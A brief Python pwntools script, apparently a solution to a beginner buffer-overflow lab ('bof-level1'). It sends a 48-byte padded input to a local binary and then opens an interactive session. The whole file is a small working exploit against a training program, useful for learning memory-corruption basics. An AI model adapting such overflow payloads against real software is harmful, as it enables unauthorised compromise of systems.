#!/usr/bin/env python

from pwn import *

p = process("./bof-level1")

buf = "A"*32 + "ABCDEFGHabcdefgh"

# This prints the output from the program
print(p.recv())

print("sending " + buf)

p.sendline(buf)

# This allows direct interaction with the application
p.interactive()
